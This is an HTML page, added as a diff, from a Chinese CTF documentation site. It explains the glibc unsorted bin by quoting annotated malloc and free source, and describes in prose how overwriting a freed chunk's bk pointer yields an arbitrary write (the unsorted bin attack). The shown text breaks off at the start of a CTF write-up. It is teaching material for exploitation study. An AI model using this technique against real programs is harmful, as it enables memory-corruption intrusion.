@@ -1,0 +1,1819 @@
+
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+        <link rel="canonical" href="http://10-0-0-55.github.io/pwn/unsorted-bin/">
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="ja">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.1.0">
+    
+    
+      
+        <title>heap/unsorted bin - 10.0.0.55 CTF Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.982221ab.css">
+      
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.01ccdecf.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+        
+<script>
+  window.ga = window.ga || function() {
+    (ga.q = ga.q || []).push(arguments)
+  }
+  ga.l = +new Date
+  /* Setup integration and send page view */
+  ga("create", "UA-129115358-1", "auto")
+  ga("set", "anonymizeIp", true)
+  ga("send", "pageview")
+  /* Register handler to log search on blur */
+  document.addEventListener("DOMContentLoaded", () => {
+    if (document.forms.search) {
+      var query = document.forms.search.query
+      query.addEventListener("blur", function() {
+        if (this.value) {
+          var path = document.location.pathname;
+          ga("send", "pageview", path + "?q=" + this.value)
+        }
+      })
+    }
+  })
+</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+    <body dir="ltr">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="__github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#unsorted-bin" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="http://10-0-0-55.github.io/" title="10.0.0.55 CTF Docs" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              10.0.0.55 CTF Docs
+            </span>
+            <span class="md-header-nav__topic">
+              heap/unsorted bin
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/10-0-0-55/10-0-0-55.github.io/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="http://10-0-0-55.github.io/" title="10.0.0.55 CTF Docs" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    10.0.0.55 CTF Docs
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/10-0-0-55/10-0-0-55.github.io/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Home" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../about/" title="About" class="md-nav__link">
+      About
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      Web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-1" type="checkbox" id="nav-3-1">
+    
+    <label class="md-nav__link" for="nav-3-1">
+      PHP
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-1">
+        PHP
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/php/audit/" title="代码审计" class="md-nav__link">
+      代码审计
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/php/LFI/" title="文件包含" class="md-nav__link">
+      文件包含
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/php/serialize/" title="反序列化相关" class="md-nav__link">
+      反序列化相关
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
+    
+    <label class="md-nav__link" for="nav-3-2">
+      Flask
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-2">
+        Flask
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/flask/ssti/" title="服务端模板注入" class="md-nav__link">
+      服务端模板注入
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/flask/session/" title="session解密" class="md-nav__link">
+      session解密
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/ssrf/" title="SSRF" class="md-nav__link">
+      SSRF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/xxe/" title="XXE" class="md-nav__link">
+      XXE
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Crypto
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../crypto/math/" title="Math" class="md-nav__link">
+      Math
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-2" type="checkbox" id="nav-4-2">
+    
+    <label class="md-nav__link" for="nav-4-2">
+      RSA
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-2">
+        RSA
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../crypto/RSA/CopperSmith/" title="CopperSmith" class="md-nav__link">
+      CopperSmith
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-3" type="checkbox" id="nav-4-3">
+    
+    <label class="md-nav__link" for="nav-4-3">
+      数字签名
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-3">
+        数字签名
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../crypto/sign/DSA/" title="DSA" class="md-nav__link">
+      DSA
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-4" type="checkbox" id="nav-4-4">
+    
+    <label class="md-nav__link" for="nav-4-4">
+      分组加密相关
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-4">
+        分组加密相关
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../crypto/block/padding/" title="padding" class="md-nav__link">
+      padding
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5" checked>
+    
+    <label class="md-nav__link" for="nav-5">
+      Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../stack-hijack/" title="stack hijack" class="md-nav__link">
+      stack hijack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../syscall/" title="syscall" class="md-nav__link">
+      syscall
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        heap/unsorted bin
+      </label>
+    
+    <a href="./" title="heap/unsorted bin" class="md-nav__link md-nav__link--active">
+      heap/unsorted bin
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#malloc" title="malloc" class="md-nav__link">
+    malloc
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#free" title="free" class="md-nav__link">
+    free
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2018-nctf-houseofhomura" title="2018 NCTF houseofhomura" class="md-nav__link">
+    2018 NCTF houseofhomura
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="前言" class="md-nav__link">
+    前言
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="功能" class="md-nav__link">
+    功能
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#add" title="add()" class="md-nav__link">
+    add()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delete" title="delete()" class="md-nav__link">
+    delete()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#modify" title="modify()" class="md-nav__link">
+    modify()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#edit_len_0" title="edit_len_0" class="md-nav__link">
+    edit_len_0
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="分析" class="md-nav__link">
+    分析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#leak-heap-libc" title="leak heap &amp; libc" class="md-nav__link">
+    leak heap &amp; libc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fake-unsorted-bin" title="构造 fake unsorted bin 链" class="md-nav__link">
+    构造 fake unsorted bin 链
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gdb" title="gdb 调试" class="md-nav__link">
+    gdb 调试
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#delete5-modify" title="delete(5) &amp; modify()" class="md-nav__link">
+    delete(5) &amp; modify()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#add-modify0" title="add() &amp; modify(0)" class="md-nav__link">
+    add() &amp; modify(0)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delete0-add0x10-p64main_arena88p64heap_base0x120-0x80-p64main_arena884" title="delete(0) &amp; add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)" class="md-nav__link">
+    delete(0) &amp; add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hijack" title="hijack" class="md-nav__link">
+    hijack
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exp1" title="exp1" class="md-nav__link">
+    exp1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp2" title="exp2" class="md-nav__link">
+    exp2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" title="完整 exp" class="md-nav__link">
+    完整 exp
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../IDApython/" title="IDA IDApython" class="md-nav__link">
+      IDA IDApython
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#malloc" title="malloc" class="md-nav__link">
+    malloc
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#free" title="free" class="md-nav__link">
+    free
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2018-nctf-houseofhomura" title="2018 NCTF houseofhomura" class="md-nav__link">
+    2018 NCTF houseofhomura
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="前言" class="md-nav__link">
+    前言
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="功能" class="md-nav__link">
+    功能
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#add" title="add()" class="md-nav__link">
+    add()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delete" title="delete()" class="md-nav__link">
+    delete()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#modify" title="modify()" class="md-nav__link">
+    modify()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#edit_len_0" title="edit_len_0" class="md-nav__link">
+    edit_len_0
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="分析" class="md-nav__link">
+    分析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#leak-heap-libc" title="leak heap &amp; libc" class="md-nav__link">
+    leak heap &amp; libc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fake-unsorted-bin" title="构造 fake unsorted bin 链" class="md-nav__link">
+    构造 fake unsorted bin 链
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gdb" title="gdb 调试" class="md-nav__link">
+    gdb 调试
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#delete5-modify" title="delete(5) &amp; modify()" class="md-nav__link">
+    delete(5) &amp; modify()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#add-modify0" title="add() &amp; modify(0)" class="md-nav__link">
+    add() &amp; modify(0)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delete0-add0x10-p64main_arena88p64heap_base0x120-0x80-p64main_arena884" title="delete(0) &amp; add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)" class="md-nav__link">
+    delete(0) &amp; add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hijack" title="hijack" class="md-nav__link">
+    hijack
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exp1" title="exp1" class="md-nav__link">
+    exp1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp2" title="exp2" class="md-nav__link">
+    exp2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" title="完整 exp" class="md-nav__link">
+    完整 exp
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/10-0-0-55/10-0-0-55.github.io/tree/mkdocs/docs/pwn/unsorted-bin.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="unsorted-bin">Unsorted bin<a class="headerlink" href="#unsorted-bin" title="Permanent link">&para;</a></h1>
+<h2 id="malloc">malloc<a class="headerlink" href="#malloc" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span>static void *
+_int_malloc (mstate av, size_t bytes)       // mstate 为 main_arena 结构体 
+{
+    INTERNAL_SIZE_T nb;               /* normalized request size */
+    unsigned int idx;                 /* associated bin index */
+    mbinptr bin;                      /* associated bin */
+
+    mchunkptr victim;                 /* inspected/selected chunk */
+    INTERNAL_SIZE_T size;             /* its size */
+    int victim_index;                 /* its bin index */
+
+    mchunkptr remainder;              /* remainder from a split */
+    unsigned long remainder_size;     /* its size */
+
+    unsigned int block;               /* bit map traverser */
+    unsigned int bit;                 /* bit map traverser */
+    unsigned int map;                 /* current word of binmap */
+
+    mchunkptr fwd;                    /* misc temp for linking */
+    mchunkptr bck;                    /* misc temp for linking */
+
+    // Covert request size to normalized request size
+    checksed_request2size(bytes, nb);
+    ...
+
+    for(;;)
+    {
+        int iters = 0;
+        while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks(av))     // unsorted_chunk (av) 为 main arena + 88 即 main arena 中存储 unsorted bin fd bk 的地方
+        {
+            bck = victim-&gt;bk;               // victim 为将被从 unsorted bin 链上取下来的那一块
+            size = chunksize(victim);
+            mchunkptr next = chunk_at_offset (victim, size);
+
+            ...
+            / *  glibc2.27 add the check  glibc2.23 doesn&#39;t have this check
+            if (__glibc_unlikely (bck-&gt;fd != victim)
+                || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))
+              malloc_printerr (&quot;mallloc(): unsorted double linked list corrupted&quot;);
+            if (__libc_unlikely (prev_inuse (next)))
+              malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);
+            */
+
+            // if a small request , try to ues last remainder if it is the only chunk in unosrted bin.
+            if (in_samllbin_range (nb) &amp;&amp; 
+                bck == unsorted_chunks (av) &amp;&amp;
+                victim == av-&gt;last_remainder &amp;&amp;
+                (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))
+            {...}
+
+            /* remove from unsorted list */
+            if (__glibc_unlikely (bck-&gt;fd != victim))
+              malloc_printerr(&quot;malloc(): corrupted unsorted chunks 3&quot;);
+            unsorted_chunks (av)-&gt;bk = bck; 
+            bck-&gt;fd = unsorted_chunks (av);
+
+            /* Take now instead of binning if exact fit */
+
+            // because size fits ,so after setting some values or checking some values, it returns p
+            if (size == nb)
+            {
+                ...
+                return p;
+            }
+
+            /* place chunk in bin */
+
+            if (in_samllbin_range (size))
+            {
+                victim_index = smallbin_index (size);
+                bck = bin_at (av, victim_index);
+                fwd = bck-&gt;fd;
+            }
+            else 
+            {
+                victim_index = largenbin_index(size);
+                bck = bin_at (av, victim_index);
+                fwd = bck-&gt;fd;
+
+                /* maintain large bins in sorted order */
+                if (fwd != bck)
+                {...}
+                else 
+                {...}
+
+            }
+
+            mark_bin(av, victim_index);
+            victim-&gt;bk = bck;
+            victim-&gt;fd = fwd;
+            fwd-&gt;bk = victim;
+            bck-&gt;fd = victim;
+
+#define MAX_ITERS         10000
+            if (iters &gt;= MAX_ITERS)
+                break;
+        }
+
+        /*
+            If a large request, scan through the chunks of current bin in
+            sorted order to find smallest that fits.  Use the skip list for this.
+        */
+
+        if (!in_smallbin_range(nb))
+        {...}
+        else 
+        {...}
+
+        ...
+
+        use top :
+            ...
+
+        ...
+    }
+
+}
+</pre></div>
+
+<p>上述代码中 // 注释的为笔者加的注释，/* */ 为代码中原生注释，英文写的 // 为笔者为便于理解 unsorted bin 的大框架简写了代码中原生注释 <br/></p>
+<p>在笔者看来，unsorted bin 中取下 victim 那一块时 ，victim 的 bk 可以称得上是 unsorted bin malloc 的发起点，相反 victim 的 fd 甚至基本毫无提及。在检测很少的 unsorted bin 的 malloc ，如果能修改 free 掉的 unsorted bin 的 bk，将 unsorted bin 的 bk 改成 目标地址-0x10，那么就能在 fake_bk+0x10 的地址上写上 (main arena+88) 的值，比如将 global_max_fast 的值改大，则之后的 chunk 的 malloc 和 free 皆变成了 fastbin 的 malloc 和 free，但是 unsorted bin 的机制基本可以说是废掉了，再使用便会 crash。<br/></p>
+<p>主流的两种 unsorted bin attack ，一种是更改 global_max_fast 另一种是 house of orange 中更改 _IO_list_all (这个我还没搞懂，留坑=.=) <br/></p>
+<p>学长说还有一种比较典型的 attack , house of roman 也是用的这个办法，略微看了一下，基本思想就是，能够将 main_arena+88 写入 <code>__malloc_hook</code> 然后进行更改后3个字节，触发 <code>malloc_printerr</code> 从而 getshell (留坑)<br/></p>
+<h2 id="free">free<a class="headerlink" href="#free" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span>__int_free (mstate av, mchunkptr p, int have_lock)
+{
+    INTERNAL_SIZE_T size;        /* its size */
+    mfastbinptr *fb;             /* associated fastbin */
+    mchunkptr nextchunk;         /* next contiguous chunk */
+    INTERNAL_SIZE_T nextsize;    /* its size */
+    int nextinuse;               /* true if nextchunk is used */
+    INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
+    mchunkptr bck;               /* misc temp for linking */
+    mchunkptr fwd;               /* misc temp for linking */
+
+    ...
+
+    if (nextchunk != av-&gt;top)
+    {
+        ...
+
+        /*
+          Place the chunk in unsorted chunk list. Chunks are
+          not placed into regular bins until after they have
+          been given one chance to be used in malloc.
+        */
+
+        bck = unsorted_chunks(av);
+        fwd = bck-&gt;fd;
+        if (__glibc_unlikely (fwd-&gt;bk != bck))
+            malloc_printerr (&quot;free(): corrupted unsorted chunks&quot;);
+        p-&gt;fd = fwd;
+        p-&gt;bk = bck;
+        if (!in_smallbin_range(size))
+        {
+            p-&gt;fd_nextsize = NULL;
+            p-&gt;bk_nextsize = NULL;
+        }
+        bck-&gt;fd = p;
+        fwd-&gt;bk = p;
+
+        ...
+    }
+
+    ...
+
+}
+</pre></div>
+
+<p>unsorted bin 的 free 就朴实很多，跟正常的双向链表没什么区别。</p>
+<h2 id="2018-nctf-houseofhomura">2018 NCTF houseofhomura<a class="headerlink" href="#2018-nctf-houseofhomura" title="Permanent link">&para;</a></h2>
+<h3 id="_1">前言<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
